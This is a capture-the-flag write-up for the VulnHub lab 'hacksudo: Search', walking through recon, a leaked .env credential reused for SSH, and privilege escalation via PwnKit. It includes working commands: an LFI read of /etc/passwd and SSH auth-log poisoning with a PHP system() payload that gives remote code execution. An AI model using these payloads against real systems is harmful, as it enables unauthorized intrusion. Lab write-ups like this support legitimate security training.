# hacksudo: Search (VulnHub) — Writeup

**Target:** 172.20.10.6
**Platform:** VulnHub ("hacksudo: Search")
**Difficulty:** Beginner/Intermediate

## Recon

```
nmap -sV -sC -p- 172.20.10.6
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.9p1 Debian |
| 80/tcp | http | Apache 2.4.38 (Debian) |

## Enumeration

### search.php — a dead end, deliberately

`search.php` looked like the obvious target but was well filtered — command-injection attempts against its `q` parameter didn't get anywhere, so it was set aside in favor of other paths.

### Nikto + manual discovery

A Nikto pass flagged several useful leads: directory indexing on `/account/`, an exposed `/README.md`, and — the important one — an exposed `/.env` file:

```
curl http://172.20.10.6/.env

APP_name=HackSudoSearch
DB_CONNECTION=mysql
DB_USERNAME=hiraman
DB_PASSWORD=MyD4dSuperH3r0!
```

### Credential reuse → SSH

The DB username in `.env` (`hiraman`) didn't work over SSH with that password, but the box's own name was the tell — **`hacksudo`** was the right account:

```
ssh hacksudo@172.20.10.6
# password: MyD4dSuperH3r0!
```

```
hacksudo@HacksudoSearch:~$ cat user.txt
d045e6f9feb79e94442213f9d008ac48
```

The home directory also had a note left by the box author (Vishal Waghmare) spelling out the intended path for anyone who got stuck: LFI/log poisoning on `search1.php`, the `.env` password hint, trying the handful of candidate usernames, and a SUID binary called `searchinstall` with a `PATH`-hijackable install command inside `searchinstall.c`.

## A second route in — LFI + SSH log poisoning (search1.php)

Separately from the SSH route above, `search1.php` turned out to be vulnerable to LFI via its `me` parameter — arbitrary file read, no filtering:

```
curl 'http://172.20.10.6/search1.php?me=/etc/passwd'
```

That's enough on its own for an RCE primitive via **SSH log poisoning**: attempting an SSH login with a PHP payload as the *username* gets that payload written verbatim into `/var/log/auth.log` by the failed-login entry. Including that log file through the LFI then executes it.

```
# attacker side — "login" with a payload as the username
ssh '<?php system($_GET[0]);?>'@172.20.10.6
```

```
curl 'http://172.20.10.6/search1.php?me=/var/log/auth.log&0=id'
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell as `www-data`, no credentials required.

## Privilege Escalation

The box's intended route (per its own hint note) is the SUID `searchinstall` binary: its source, `searchinstall.c`, calls an install command without a fully-qualified path, so placing a malicious script earlier on `$PATH` under that command's name and then running the SUID binary executes it as root — a classic PATH-hijack privesc.

In practice, PwnKit (CVE-2021-4034) was used instead to get the root shell, consistent with the rest of the `hacksudo` series on this same vulnerable Ubuntu/Debian base:

```
root@HacksudoSearch:~#
```

## Summary / Techniques Used

- Nikto-driven discovery of an exposed `.env` leaking DB credentials
- Credential reuse across services, with the correct SSH username guessed from context (the box's own name) rather than the leaked DB username
- A second, fully unauthenticated path: LFI (`search1.php?me=`) chained with **SSH auth.log poisoning** for RCE as `www-data` — no creds needed at all
- Intended privesc design: SUID binary + unqualified command inside its source → `PATH` hijack
- Actual privesc used: PwnKit / CVE-2021-4034

## Note

The box ships its own in-box hint/credits note (left by the author) once you reach a user shell, which confirms the vulnerabilities above are the intended ones rather than unintended side-doors — worth citing in the published writeup for context.
